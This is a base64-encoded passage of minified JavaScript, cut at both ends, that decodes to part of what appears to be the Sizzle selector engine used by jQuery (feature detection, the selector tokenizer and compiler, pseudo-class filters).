lbmd0aD1uLTF9fX1NPXQuc3VwcG9ydD17fSx3PXQuaXNYTUw9ZnVuY3Rpb24oZSl7dmFyIHQ9ZSYmKGUub3duZXJEb2N1bWVudHx8ZSkuZG9jdW1lbnRFbGVtZW50O3JldHVybiB0PyJIVE1MIiE9PXQubm9kZU5hbWU6ITF9LEg9dC5zZXREb2N1bWVudD1mdW5jdGlvbihlKXt2YXIgdCxuLHI9ZT9lLm93bmVyRG9jdW1lbnR8fGU6STtyZXR1cm4gciE9PVAmJjk9PT1yLm5vZGVUeXBlJiZyLmRvY3VtZW50RWxlbWVudD8oUD1yLEU9UC5kb2N1bWVudEVsZW1lbnQsRj0hdyhQKSwobj1QLmRlZmF1bHRWaWV3KSYmbi50b3AhPT1uJiYobi5hZGRFdmVudExpc3RlbmVyP24uYWRkRXZlbnRMaXN0ZW5lcigidW5sb2FkIixMZSwhMSk6bi5hdHRhY2hFdmVudCYmbi5hdHRhY2hFdmVudCgib251bmxvYWQiLExlKSksTS5hdHRyaWJ1dGVzPWkoZnVuY3Rpb24oZSl7cmV0dXJuIGUuY2xhc3NOYW1lPSJpIiwhZS5nZXRBdHRyaWJ1dGUoImNsYXNzTmFtZSIpfSksTS5nZXRFbGVtZW50c0J5VGFnTmFtZT1pKGZ1bmN0aW9uKGUpe3JldHVybiBlLmFwcGVuZENoaWxkKFAuY3JlYXRlQ29tbWVudCgiIikpLCFlLmdldEVsZW1lbnRzQnlUYWdOYW1lKCIqIikubGVuZ3RofSksTS5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lPW1lLnRlc3QoUC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKSxNLmdldEJ5SWQ9aShmdW5jdGlvbihlKXtyZXR1cm4gRS5hcHBlbmRDaGlsZChlKS5pZD1OLCFQLmdldEVsZW1lbnRzQnlOYW1lfHwhUC5nZXRFbGVtZW50c0J5TmFtZShOKS5sZW5ndGh9KSxNLmdldEJ5SWQ/KEwuZmluZC5JRD1mdW5jdGlvbihlLHQpe2lmKCJ1bmRlZmluZWQiIT10eXBlb2YgdC5nZXRFbGVtZW50QnlJZCYmRil7dmFyIG49dC5nZXRFbGVtZW50QnlJZChlKTtyZXR1cm4gbj9bbl06W119fSxMLmZpbHRlci5JRD1mdW5jdGlvbihlKXt2YXIgdD1lLnJlcGxhY2UoYmUsTWUpO3JldHVybiBmdW5jdGlvbihlKXtyZXR1cm4gZS5nZXRBdHRyaWJ1dGUoImlkIik9PT10fX0pOihkZWxldGUgTC5maW5kLklELEwuZmlsdGVyLklEPWZ1bmN0aW9uKGUpe3ZhciB0PWUucmVwbGFjZShiZSxNZSk7cmV0dXJuIGZ1bmN0aW9uKGUpe3ZhciBuPSJ1bmRlZmluZWQiIT10eXBlb2YgZS5nZXRBdHRyaWJ1dGVOb2RlJiZlLmdldEF0dHJpYnV0ZU5vZGUoImlkIik7cmV0dXJuIG4mJm4udmFsdWU9PT10fX0pLEwuZmluZC5UQUc9TS5nZXRFbGVtZW50c0J5VGFnTmFtZT9mdW5jdGlvbihlLHQpe3JldHVybiJ1bmRlZmluZWQiIT10eXBlb2YgdC5nZXRFbGVtZW50c0J5VGFnTmFtZT90LmdldEVsZW1lbnRzQnlUYWdOYW1lKGUpOk0ucXNhP3QucXVlcnlTZWxlY3RvckFsbChlKTp2b2lkIDB9OmZ1bmN0aW9uKGUsdCl7dmFyIG4scj1bXSxpPTAscz10LmdldEVsZW1lbnRzQnlUYWdOYW1lKGUpO2lmKCIqIj09PWUpe2Zvcig7bj1zW2krK107KTE9PT1uLm5vZGVUeXBlJiZyLnB1c2gobik7cmV0dXJuIHJ9cmV0dXJuIHN9LEwuZmluZC5DTEFTUz1NLmdldEVsZW1lbnRzQnlDbGFzc05hbWUmJmZ1bmN0aW9uKGUsdCl7cmV0dXJuInVuZGVmaW5lZCIhPXR5cGVvZiB0LmdldEVsZW1lbnRzQnlDbGFzc05hbWUmJkY/dC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKGUpOnZvaWQgMH0sQT1bXSxDPVtdLChNLnFzYT1tZS50ZXN0KFAucXVlcnlTZWxlY3RvckFsbCkpJiYoaShmdW5jdGlvbihlKXtFLmFwcGVuZENoaWxkKGUpLmlubmVySFRNTD0iPGEgaWQ9JyIrTisiJz48L2E+PHNlbGVjdCBpZD0nIitOKyItXHJcXCcgbXNhbGxvd2NhcHR1cmU9Jyc+PG9wdGlvbiBzZWxlY3RlZD0nJz48L29wdGlvbj48L3NlbGVjdD4iLGUucXVlcnlTZWxlY3RvckFsbCgiW21zYWxsb3djYXB0dXJlXj0nJ10iKS5sZW5ndGgmJkMucHVzaCgiWypeJF09IituZSsiKig/OicnfFwiXCIpIiksZS5xdWVyeVNlbGVjdG9yQWxsKCJbc2VsZWN0ZWRdIikubGVuZ3RofHxDLnB1c2goIlxcWyIrbmUrIiooPzp2YWx1ZXwiK3RlKyIpIiksZS5xdWVyeVNlbGVjdG9yQWxsKCJbaWR+PSIrTisiLV0iKS5sZW5ndGh8fEMucHVzaCgifj0iKSxlLnF1ZXJ5U2VsZWN0b3JBbGwoIjpjaGVja2VkIikubGVuZ3RofHxDLnB1c2goIjpjaGVja2VkIiksZS5xdWVyeVNlbGVjdG9yQWxsKCJhIyIrTisiKyoiKS5sZW5ndGh8fEMucHVzaCgiLiMuK1srfl0iKX0pLGkoZnVuY3Rpb24oZSl7dmFyIHQ9UC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpO3Quc2V0QXR0cmlidXRlKCJ0eXBlIiwiaGlkZGVuIiksZS5hcHBlbmRDaGlsZCh0KS5zZXRBdHRyaWJ1dGUoIm5hbWUiLCJEIiksZS5xdWVyeVNlbGVjdG9yQWxsKCJbbmFtZT1kXSIpLmxlbmd0aCYmQy5wdXNoKCJuYW1lIituZSsiKlsqXiR8IX5dPz0iKSxlLnF1ZXJ5U2VsZWN0b3JBbGwoIjplbmFibGVkIikubGVuZ3RofHxDLnB1c2goIjplbmFibGVkIiwiOmRpc2FibGVkIiksZS5xdWVyeVNlbGVjdG9yQWxsKCIqLDp4IiksQy5wdXNoKCIsLio6Iil9KSksKE0ubWF0Y2hlc1NlbGVjdG9yPW1lLnRlc3QoTz1FLm1hdGNoZXN8fEUud2Via2l0TWF0Y2hlc1NlbGVjdG9yfHxFLm1vek1hdGNoZXNTZWxlY3Rvcnx8RS5vTWF0Y2hlc1NlbGVjdG9yfHxFLm1zTWF0Y2hlc1NlbGVjdG9yKSkmJmkoZnVuY3Rpb24oZSl7TS5kaXNjb25uZWN0ZWRNYXRjaD1PLmNhbGwoZSwiZGl2IiksTy5jYWxsKGUsIltzIT0nJ106eCIpLEEucHVzaCgiIT0iLHNlKX0pLEM9Qy5sZW5ndGgmJm5ldyBSZWdFeHAoQy5qb2luKCJ8IikpLEE9QS5sZW5ndGgmJm5ldyBSZWdFeHAoQS5qb2luKCJ8IikpLHQ9bWUudGVzdChFLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uKSxSPXR8fG1lLnRlc3QoRS5jb250YWlucyk/ZnVuY3Rpb24oZSx0KXt2YXIgbj05PT09ZS5ub2RlVHlwZT9lLmRvY3VtZW50RWxlbWVudDplLHI9dCYmdC5wYXJlbnROb2RlO3JldHVybiBlPT09cnx8ISghcnx8MSE9PXIubm9kZVR5cGV8fCEobi5jb250YWlucz9uLmNvbnRhaW5zKHIpOmUuY29tcGFyZURvY3VtZW50UG9zaXRpb24mJjE2JmUuY29tcGFyZURvY3VtZW50UG9zaXRpb24ocikpKX06ZnVuY3Rpb24oZSx0KXtpZih0KWZvcig7dD10LnBhcmVudE5vZGU7KWlmKHQ9PT1lKXJldHVybiEwO3JldHVybiExfSwkPXQ/ZnVuY3Rpb24oZSx0KXtpZihlPT09dClyZXR1cm4gaj0hMCwwO3ZhciBuPSFlLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uLSF0LmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uO3JldHVybiBuP246KG49KGUub3duZXJEb2N1bWVudHx8ZSk9PT0odC5vd25lckRvY3VtZW50fHx0KT9lLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uKHQpOjEsMSZufHwhTS5zb3J0RGV0YWNoZWQmJnQuY29tcGFyZURvY3VtZW50UG9zaXRpb24oZSk9PT1uP2U9PT1QfHxlLm93bmVyRG9jdW1lbnQ9PT1JJiZSKEksZSk/LTE6dD09PVB8fHQub3duZXJEb2N1bWVudD09PUkmJlIoSSx0KT8xOng/ZWUoeCxlKS1lZSh4LHQpOjA6NCZuPy0xOjEpfTpmdW5jdGlvbihlLHQpe2lmKGU9PT10KXJldHVybiBqPSEwLDA7dmFyIG4scj0wLGk9ZS5wYXJlbnROb2RlLHM9dC5wYXJlbnROb2RlLGE9W2VdLHU9W3RdO2lmKCFpfHwhcylyZXR1cm4gZT09PVA/LTE6dD09PVA/MTppPy0xOnM/MTp4P2VlKHgsZSktZWUoeCx0KTowO2lmKGk9PT1zKXJldHVybiBvKGUsdCk7Zm9yKG49ZTtuPW4ucGFyZW50Tm9kZTspYS51bnNoaWZ0KG4pO2ZvcihuPXQ7bj1uLnBhcmVudE5vZGU7KXUudW5zaGlmdChuKTtmb3IoO2Fbcl09PT11W3JdOylyKys7cmV0dXJuIHI/byhhW3JdLHVbcl0pOmFbcl09PT1JPy0xOnVbcl09PT1JPzE6MH0sUCk6UH0sdC5tYXRjaGVzPWZ1bmN0aW9uKGUsbil7cmV0dXJuIHQoZSxudWxsLG51bGwsbil9LHQubWF0Y2hlc1NlbGVjdG9yPWZ1bmN0aW9uKGUsbil7aWYoKGUub3duZXJEb2N1bWVudHx8ZSkhPT1QJiZIKGUpLG49bi5yZXBsYWNlKGxlLCI9JyQxJ10iKSxNLm1hdGNoZXNTZWxlY3RvciYmRiYmIUpbbisiICJdJiYoIUF8fCFBLnRlc3QobikpJiYoIUN8fCFDLnRlc3QobikpKXRyeXt2YXIgcj1PLmNhbGwoZSxuKTtpZihyfHxNLmRpc2Nvbm5lY3RlZE1hdGNofHxlLmRvY3VtZW50JiYxMSE9PWUuZG9jdW1lbnQubm9kZVR5cGUpcmV0dXJuIHJ9Y2F0Y2goaSl7fXJldHVybiB0KG4sUCxudWxsLFtlXSkubGVuZ3RoPjB9LHQuY29udGFpbnM9ZnVuY3Rpb24oZSx0KXtyZXR1cm4oZS5vd25lckRvY3VtZW50fHxlKSE9PVAmJkgoZSksUihlLHQpfSx0LmF0dHI9ZnVuY3Rpb24oZSx0KXsoZS5vd25lckRvY3VtZW50fHxlKSE9PVAmJkgoZSk7dmFyIG49TC5hdHRySGFuZGxlW3QudG9Mb3dlckNhc2UoKV0scj1uJiZWLmNhbGwoTC5hdHRySGFuZGxlLHQudG9Mb3dlckNhc2UoKSk/bihlLHQsIUYpOnZvaWQgMDtyZXR1cm4gdm9pZCAwIT09cj9yOk0uYXR0cmlidXRlc3x8IUY/ZS5nZXRBdHRyaWJ1dGUodCk6KHI9ZS5nZXRBdHRyaWJ1dGVOb2RlKHQpKSYmci5zcGVjaWZpZWQ/ci52YWx1ZTpudWxsfSx0LmVycm9yPWZ1bmN0aW9uKGUpe3Rocm93IG5ldyBFcnJvcigiU3ludGF4IGVycm9yLCB1bnJlY29nbml6ZWQgZXhwcmVzc2lvbjogIitlKX0sdC51bmlxdWVTb3J0PWZ1bmN0aW9uKGUpe3ZhciB0LG49W10scj0wLGk9MDtpZihqPSFNLmRldGVjdER1cGxpY2F0ZXMseD0hTS5zb3J0U3RhYmxlJiZlLnNsaWNlKDApLGUuc29ydCgkKSxqKXtmb3IoO3Q9ZVtpKytdOyl0PT09ZVtpXSYmKHI9bi5wdXNoKGkpKTtmb3IoO3ItLTspZS5zcGxpY2UobltyXSwxKX1yZXR1cm4geD1udWxsLGV9LGs9dC5nZXRUZXh0PWZ1bmN0aW9uKGUpe3ZhciB0LG49IiIscj0wLGk9ZS5ub2RlVHlwZTtpZihpKXtpZigxPT09aXx8OT09PWl8fDExPT09aSl7aWYoInN0cmluZyI9PXR5cGVvZiBlLnRleHRDb250ZW50KXJldHVybiBlLnRleHRDb250ZW50O2ZvcihlPWUuZmlyc3RDaGlsZDtlO2U9ZS5uZXh0U2libGluZyluKz1rKGUpfWVsc2UgaWYoMz09PWl8fDQ9PT1pKXJldHVybiBlLm5vZGVWYWx1ZX1lbHNlIGZvcig7dD1lW3IrK107KW4rPWsodCk7cmV0dXJuIG59LEw9dC5zZWxlY3RvcnM9e2NhY2hlTGVuZ3RoOjUwLGNyZWF0ZVBzZXVkbzpyLG1hdGNoOmZlLGF0dHJIYW5kbGU6e30sZmluZDp7fSxyZWxhdGl2ZTp7Ij4iOntkaXI6InBhcmVudE5vZGUiLGZpcnN0OiEwfSwiICI6e2RpcjoicGFyZW50Tm9kZSJ9LCIrIjp7ZGlyOiJwcmV2aW91c1NpYmxpbmciLGZpcnN0OiEwfSwifiI6e2RpcjoicHJldmlvdXNTaWJsaW5nIn19LHByZUZpbHRlcjp7QVRUUjpmdW5jdGlvbihlKXtyZXR1cm4gZVsxXT1lWzFdLnJlcGxhY2UoYmUsTWUpLGVbM109KGVbM118fGVbNF18fGVbNV18fCIiKS5yZXBsYWNlKGJlLE1lKSwifj0iPT09ZVsyXSYmKGVbM109IiAiK2VbM10rIiAiKSxlLnNsaWNlKDAsNCl9LENISUxEOmZ1bmN0aW9uKGUpe3JldHVybiBlWzFdPWVbMV0udG9Mb3dlckNhc2UoKSwibnRoIj09PWVbMV0uc2xpY2UoMCwzKT8oZVszXXx8dC5lcnJvcihlWzBdKSxlWzRdPSsoZVs0XT9lWzVdKyhlWzZdfHwxKToyKigiZXZlbiI9PT1lWzNdfHwib2RkIj09PWVbM10pKSxlWzVdPSsoZVs3XStlWzhdfHwib2RkIj09PWVbM10pKTplWzNdJiZ0LmVycm9yKGVbMF0pLGV9LFBTRVVETzpmdW5jdGlvbihlKXt2YXIgdCxuPSFlWzZdJiZlWzJdO3JldHVybiBmZS5DSElMRC50ZXN0KGVbMF0pP251bGw6KGVbM10/ZVsyXT1lWzRdfHxlWzVdfHwiIjpuJiZkZS50ZXN0KG4pJiYodD1UKG4sITApKSYmKHQ9bi5pbmRleE9mKCIpIixuLmxlbmd0aC10KS1uLmxlbmd0aCkmJihlWzBdPWVbMF0uc2xpY2UoMCx0KSxlWzJdPW4uc2xpY2UoMCx0KSksZS5zbGljZSgwLDMpKX19LGZpbHRlcjp7VEFHOmZ1bmN0aW9uKGUpe3ZhciB0PWUucmVwbGFjZShiZSxNZSkudG9Mb3dlckNhc2UoKTtyZXR1cm4iKiI9PT1lP2Z1bmN0aW9uKCl7cmV0dXJuITB9OmZ1bmN0aW9uKGUpe3JldHVybiBlLm5vZGVOYW1lJiZlLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk9PT10fX0sQ0xBU1M6ZnVuY3Rpb24oZSl7dmFyIHQ9eltlKyIgIl07cmV0dXJuIHR8fCh0PW5ldyBSZWdFeHAoIihefCIrbmUrIikiK2UrIigiK25lKyJ8JCkiKSkmJnooZSxmdW5jdGlvbihlKXtyZXR1cm4gdC50ZXN0KCJzdHJpbmciPT10eXBlb2YgZS5jbGFzc05hbWUmJmUuY2xhc3NOYW1lfHwidW5kZWZpbmVkIiE9dHlwZW9mIGUuZ2V0QXR0cmlidXRlJiZlLmdldEF0dHJpYnV0ZSgiY2xhc3MiKXx8IiIpfSl9LEFUVFI6ZnVuY3Rpb24oZSxuLHIpe3JldHVybiBmdW5jdGlvbihpKXt2YXIgcz10LmF0dHIoaSxlKTtyZXR1cm4gbnVsbD09cz8iIT0iPT09bjpuPyhzKz0iIiwiPSI9PT1uP3M9PT1yOiIhPSI9PT1uP3MhPT1yOiJePSI9PT1uP3ImJjA9PT1zLmluZGV4T2Yocik6Iio9Ij09PW4/ciYmcy5pbmRleE9mKHIpPi0xOiIkPSI9PT1uP3ImJnMuc2xpY2UoLXIubGVuZ3RoKT09PXI6In49Ij09PW4/KCIgIitzLnJlcGxhY2Uob2UsIiAiKSsiICIpLmluZGV4T2Yocik+LTE6Inw9Ij09PW4/cz09PXJ8fHMuc2xpY2UoMCxyLmxlbmd0aCsxKT09PXIrIi0iOiExKTohMH19LENISUxEOmZ1bmN0aW9uKGUsdCxuLHIsaSl7dmFyIHM9Im50aCIhPT1lLnNsaWNlKDAsMyksbz0ibGFzdCIhPT1lLnNsaWNlKC00KSxhPSJvZi10eXBlIj09PXQ7cmV0dXJuIDE9PT1yJiYwPT09aT9mdW5jdGlvbihlKXtyZXR1cm4hIWUucGFyZW50Tm9kZX06ZnVuY3Rpb24odCxuLHUpe3ZhciBjLGwsZCxoLGYscCxfPXMhPT1vPyJuZXh0U2libGluZyI6InByZXZpb3VzU2libGluZyIsbT10LnBhcmVudE5vZGUseT1hJiZ0Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCksZz0hdSYmIWEsdj0hMTtpZihtKXtpZihzKXtmb3IoO187KXtmb3IoaD10O2g9aFtfXTspaWYoYT9oLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk9PT15OjE9PT1oLm5vZGVUeXBlKXJldHVybiExO3A9Xz0ib25seSI9PT1lJiYhcCYmIm5leHRTaWJsaW5nIn1yZXR1cm4hMH1pZihwPVtvP20uZmlyc3RDaGlsZDptLmxhc3RDaGlsZF0sbyYmZyl7Zm9yKGg9bSxkPWhbTl18fChoW05dPXt9KSxsPWRbaC51bmlxdWVJRF18fChkW2gudW5pcXVlSURdPXt9KSxjPWxbZV18fFtdLGY9Y1swXT09PVcmJmNbMV0sdj1mJiZjWzJdLGg9ZiYmbS5jaGlsZE5vZGVzW2ZdO2g9KytmJiZoJiZoW19dfHwodj1mPTApfHxwLnBvcCgpOylpZigxPT09aC5ub2RlVHlwZSYmKyt2JiZoPT09dCl7bFtlXT1bVyxmLHZdO2JyZWFrfX1lbHNlIGlmKGcmJihoPXQsZD1oW05dfHwoaFtOXT17fSksbD1kW2gudW5pcXVlSURdfHwoZFtoLnVuaXF1ZUlEXT17fSksYz1sW2VdfHxbXSxmPWNbMF09PT1XJiZjWzFdLHY9Ziksdj09PSExKWZvcig7KGg9KytmJiZoJiZoW19dfHwodj1mPTApfHxwLnBvcCgpKSYmKChhP2gubm9kZU5hbWUudG9Mb3dlckNhc2UoKSE9PXk6MSE9PWgubm9kZVR5cGUpfHwhKyt2fHwoZyYmKGQ9aFtOXXx8KGhbTl09e30pLGw9ZFtoLnVuaXF1ZUlEXXx8KGRbaC51bmlxdWVJRF09e30pLGxbZV09W1csdl0pLGghPT10KSk7KTtyZXR1cm4gdi09aSx2PT09cnx8diVyPT09MCYmdi9yPj0wfX19LFBTRVVETzpmdW5jdGlvbihlLG4pe3ZhciBpLHM9TC5wc2V1ZG9zW2VdfHxMLnNldEZpbHRlcnNbZS50b0xvd2VyQ2FzZSgpXXx8dC5lcnJvcigidW5zdXBwb3J0ZWQgcHNldWRvOiAiK2UpO3JldHVybiBzW05dP3Mobik6cy5sZW5ndGg+MT8oaT1bZSxlLCIiLG5dLEwuc2V0RmlsdGVycy5oYXNPd25Qcm9wZXJ0eShlLnRvTG93ZXJDYXNlKCkpP3IoZnVuY3Rpb24oZSx0KXtmb3IodmFyIHIsaT1zKGUsbiksbz1pLmxlbmd0aDtvLS07KXI9ZWUoZSxpW29dKSxlW3JdPSEodFtyXT1pW29dKX0pOmZ1bmN0aW9uKGUpe3JldHVybiBzKGUsMCxpKX0pOnN9fSxwc2V1ZG9zOntub3Q6cihmdW5jdGlvbihlKXt2YXIgdD1bXSxuPVtdLGk9WShlLnJlcGxhY2UoYWUsIiQxIikpO3JldHVybiBpW05dP3IoZnVuY3Rpb24oZSx0LG4scil7Zm9yKHZhciBzLG89aShlLG51bGwscixbXSksYT1lLmxlbmd0aDthLS07KShzPW9bYV0pJiYoZVthXT0hKHRbYV09cykpfSk6ZnVuY3Rpb24oZSxyLHMpe3JldHVybiB0WzBdPWUsaSh0LG51bGwscyxuKSx0WzBdPW51bGwsIW4ucG9wKCl9fSksaGFzOnIoZnVuY3Rpb24oZSl7cmV0dXJuIGZ1bmN0aW9uKG4pe3JldHVybiB0KGUsbikubGVuZ3RoPjB9fSksY29udGFpbnM6cihmdW5jdGlvbihlKXtyZXR1cm4gZT1lLnJlcGxhY2UoYmUsTWUpLGZ1bmN0aW9uKHQpe3JldHVybih0LnRleHRDb250ZW50fHx0LmlubmVyVGV4dHx8ayh0KSkuaW5kZXhPZihlKT4tMX19KSxsYW5nOnIoZnVuY3Rpb24oZSl7cmV0dXJuIGhlLnRlc3QoZXx8IiIpfHx0LmVycm9yKCJ1bnN1cHBvcnRlZCBsYW5nOiAiK2UpLGU9ZS5yZXBsYWNlKGJlLE1lKS50b0xvd2VyQ2FzZSgpLGZ1bmN0aW9uKHQpe3ZhciBuO2RvIGlmKG49Rj90Lmxhbmc6dC5nZXRBdHRyaWJ1dGUoInhtbDpsYW5nIil8fHQuZ2V0QXR0cmlidXRlKCJsYW5nIikpcmV0dXJuIG49bi50b0xvd2VyQ2FzZSgpLG49PT1lfHwwPT09bi5pbmRleE9mKGUrIi0iKTt3aGlsZSgodD10LnBhcmVudE5vZGUpJiYxPT09dC5ub2RlVHlwZSk7cmV0dXJuITF9fSksdGFyZ2V0OmZ1bmN0aW9uKHQpe3ZhciBuPWUubG9jYXRpb24mJmUubG9jYXRpb24uaGFzaDtyZXR1cm4gbiYmbi5zbGljZSgxKT09PXQuaWR9LHJvb3Q6ZnVuY3Rpb24oZSl7cmV0dXJuIGU9PT1FfSxmb2N1czpmdW5jdGlvbihlKXtyZXR1cm4gZT09PVAuYWN0aXZlRWxlbWVudCYmKCFQLmhhc0ZvY3VzfHxQLmhhc0ZvY3VzKCkpJiYhIShlLnR5cGV8fGUuaHJlZnx8fmUudGFiSW5kZXgpfSxlbmFibGVkOmZ1bmN0aW9uKGUpe3JldHVybiBlLmRpc2FibGVkPT09ITF9LGRpc2FibGVkOmZ1bmN0aW9uKGUpe3JldHVybiBlLmRpc2FibGVkPT09ITB9LGNoZWNrZWQ6ZnVuY3Rpb24oZSl7dmFyIHQ9ZS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpO3JldHVybiJpbnB1dCI9PT10JiYhIWUuY2hlY2tlZHx8Im9wdGlvbiI9PT10JiYhIWUuc2VsZWN0ZWR9LHNlbGVjdGVkOmZ1bmN0aW9uKGUpe3JldHVybiBlLnBhcmVudE5vZGUmJmUucGFyZW50Tm9kZS5zZWxlY3RlZEluZGV4LGUuc2VsZWN0ZWQ9PT0hMH0sZW1wdHk6ZnVuY3Rpb24oZSl7Zm9yKGU9ZS5maXJzdENoaWxkO2U7ZT1lLm5leHRTaWJsaW5nKWlmKGUubm9kZVR5cGU8NilyZXR1cm4hMTtyZXR1cm4hMH0scGFyZW50OmZ1bmN0aW9uKGUpe3JldHVybiFMLnBzZXVkb3MuZW1wdHkoZSl9LGhlYWRlcjpmdW5jdGlvbihlKXtyZXR1cm4gX2UudGVzdChlLm5vZGVOYW1lKX0saW5wdXQ6ZnVuY3Rpb24oZSl7cmV0dXJuIHBlLnRlc3QoZS5ub2RlTmFtZSl9LGJ1dHRvbjpmdW5jdGlvbihlKXt2YXIgdD1lLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk7cmV0dXJuImlucHV0Ij09PXQmJiJidXR0b24iPT09ZS50eXBlfHwiYnV0dG9uIj09PXR9LHRleHQ6ZnVuY3Rpb24oZSl7dmFyIHQ7cmV0dXJuImlucHV0Ij09PWUubm9kZU5hbWUudG9Mb3dlckNhc2UoKSYmInRleHQiPT09ZS50eXBlJiYobnVsbD09KHQ9ZS5nZXRBdHRyaWJ1dGUoInR5cGUiKSl8fCJ0ZXh0Ij09PXQudG9Mb3dlckNhc2UoKSl9LGZpcnN0OmMoZnVuY3Rpb24oKXtyZXR1cm5bMF19KSxsYXN0OmMoZnVuY3Rpb24oZSx0KXtyZXR1cm5bdC0xXX0pLGVxOmMoZnVuY3Rpb24oZSx0LG4pe3JldHVyblswPm4/bit0Om5dfSksZXZlbjpjKGZ1bmN0aW9uKGUsdCl7Zm9yKHZhciBuPTA7dD5uO24rPTIpZS5wdXNoKG4pO3JldHVybiBlfSksb2RkOmMoZnVuY3Rpb24oZSx0KXtmb3IodmFyIG49MTt0Pm47bis9MillLnB1c2gobik7cmV0dXJuIGV9KSxsdDpjKGZ1bmN0aW9uKGUsdCxuKXtmb3IodmFyIHI9MD5uP24rdDpuOy0tcj49MDspZS5wdXNoKHIpO3JldHVybiBlfSksZ3Q6YyhmdW5jdGlvbihlLHQsbil7Zm9yKHZhciByPTA+bj9uK3Q6bjsrK3I8dDspZS5wdXNoKHIpO3JldHVybiBlfSl9fSxMLnBzZXVkb3MubnRoPUwucHNldWRvcy5lcTtmb3IoYiBpbntyYWRpbzohMCxjaGVja2JveDohMCxmaWxlOiEwLHBhc3N3b3JkOiEwLGltYWdlOiEwfSlMLnBzZXVkb3NbYl09YShiKTtmb3IoYiBpbntzdWJtaXQ6ITAscmVzZXQ6ITB9KUwucHNldWRvc1tiXT11KGIpO3JldHVybiBkLnByb3RvdHlwZT1MLmZpbHRlcnM9TC5wc2V1ZG9zLEwuc2V0RmlsdGVycz1uZXcgZCxUPXQudG9rZW5pemU9ZnVuY3Rpb24oZSxuKXt2YXIgcixpLHMsbyxhLHUsYyxsPXFbZSsiICJdO2lmKGwpcmV0dXJuIG4/MDpsLnNsaWNlKDApO2ZvcihhPWUsdT1bXSxjPUwucHJlRmlsdGVyO2E7KXtyJiYhKGk9dWUuZXhlYyhhKSl8fChpJiYoYT1hLnNsaWNlKGlbMF0ubGVuZ3RoKXx8YSksdS5wdXNoKHM9W10pKSxyPSExLChpPWNlLmV4ZWMoYSkpJiYocj1pLnNoaWZ0KCkscy5wdXNoKHt2YWx1ZTpyLHR5cGU6aVswXS5yZXBsYWNlKGFlLCIgIil9KSxhPWEuc2xpY2Uoci5sZW5ndGgpKTtmb3IobyBpbiBMLmZpbHRlcikhKGk9ZmVbb10uZXhlYyhhKSl8fGNbb10mJiEoaT1jW29dKGkpKXx8KHI9aS5zaGlmdCgpLHMucHVzaCh7dmFsdWU6cix0eXBlOm8sbWF0Y2hlczppfSksYT1hLnNsaWNlKHIubGVuZ3RoKSk7aWYoIXIpYnJlYWt9cmV0dXJuIG4/YS5sZW5ndGg6YT90LmVycm9yKGUpOnEoZSx1KS5zbGljZSgwKX0sWT10LmNvbXBpbGU9ZnVuY3Rpb24oZSx0KXt2YXIgbixyPVtdLGk9W10scz1KW2UrIiAiXTtpZighcyl7Zm9yKHR8fCh0PVQoZSkpLG49dC5sZW5ndGg7bi0tOylzPWcodFtuXSksc1tOXT9yLnB1c2gocyk6aS5wdXNoKHMpO3M9SihlLHYoaSxyKSkscy5zZWxlY3Rvcj1lfXJldHVybiBzfSxEPXQuc2VsZWN0PWZ1bmN0aW9uKGUsdCxuLHIpe3ZhciBpLHMsbyxhLHUsYz0iZnVuY3Rpb24iPT10eXBlb2YgZSYmZSxkPSFyJiZUKGU9Yy5zZWxlY3Rvcnx8ZSk7aWYobj1ufHxbXSwxPT09ZC5sZW5ndGgpe2lmKHM9ZFswXT1kWzBdLnNsaWNlKDApLHMubGVuZ3RoPjImJiJJRCI9PT0obz1zWzBdKS50eXBlJiZNLmdldEJ5SWQmJjk9PT10Lm5vZGVUeXBlJiZGJiZMLnJlbGF0aXZlW3NbMV0udHlwZV0pe2lmKHQ9KEwuZmluZC5JRChvLm1hdGNoZXNbMF0ucmVwbGFjZShiZSxNZSksdCl8fFtdKVswXSwhdClyZXR1cm4gbjtjJiYodD10LnBhcmVudE5vZGUpLGU9ZS5zbGljZShzLnNoaWZ0KCkudmFsdWUubGVuZ3RoKX1mb3IoaT1mZS5uZWVkc0NvbnRleHQudGVzdChlKT8wOnMubGVuZ3RoO2ktLSYmKG89c1tpXSwhTC5yZWxhdGl2ZVthPW8udHlwZV0pOylpZigodT1MLmZpbmRbYV0pJiYocj11KG8ubWF0Y2hlc1swXS5yZXBsYWNlKGJlLE1lKSxnZS50ZXN0KHNbMF0udHlwZSkmJmwodC5wYXJlbnROb2RlKXx8dCkpKXtpZihzLnNwbGljZShpLDEpLGU9ci5sZW5ndGgmJmgocyksIWUpcmV0dXJuIEsuYXBwbHkobixyKSxuO2JyZWFrfX1yZXR1cm4oY3x8WShlLGQpKShyLHQsIUYsbiwhdHx8Z2UudGVzdChlKSYmbCh0LnBhcmVudE5vZGUpfHx0KSxufSxNLnNvcnRTdGFibGU9Ti5zcGxpdCgiIikuc29ydCgkKS5qb2luKCIiKT09PU4sTS5kZXRlY3REdXBsaWNhdGVzPSEhaixIKCksTS5zb3J0RGV0YWNoZWQ9aShmdW5jdGlvbihlKXtyZXR1cm4gMSZlLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uKFAuY3JlYXRlRWxlbWVudCgiZGl2IikpfSksaShmdW5jdGlvbihlKXtyZXR1cm4gZS5pbm5lckhUTUw9IjxhIGhyZWY9JyMnPjwvYT4iLCIjIj09PWUuZmlyc3RDaGlsZC5nZXRBdHRyaWJ1dGUoImhyZWYiKX0pfHxzKCJ0eXBlfGhyZWZ8aGVpZ2h0fHdpZHRoIixmdW5jdGlvbihlLHQsbil7cmV0dXJuIG4/dm9pZCAwOmUuZ2V0QXR0cmlidXRlKHQsInR5cGUiPT09dC50b0xvd2VyQ2FzZSgpPzE6Mil9KSxNLmF0dHJpYnV0ZXMmJmkoZnVuY3Rpb24oZSl7cmV0dXJuIGUuaW5uZXJIVE1MPSI8aW5wdXQvPiIsZS5maXJzdENoaWxkLnNldEF0dHJpYnV0ZSgidmFsdWUiLCIiKSwiIj09PWUuZmlyc3RDaGlsZC5n